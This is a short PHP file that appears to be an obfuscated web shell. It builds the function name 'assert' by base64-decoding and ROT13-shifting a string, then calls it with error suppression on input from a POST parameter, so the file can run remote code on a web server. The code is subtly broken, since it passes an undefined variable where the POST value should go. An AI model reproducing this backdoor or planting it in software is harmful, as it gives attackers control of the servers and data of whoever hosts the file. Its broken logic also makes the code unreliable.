﻿<?php
function moza($admin){   
$b ="bmZmcmVn";
$d = str_rot13(base64_decode($b));
@$d($a);
}
moza($_POST[1]);
?>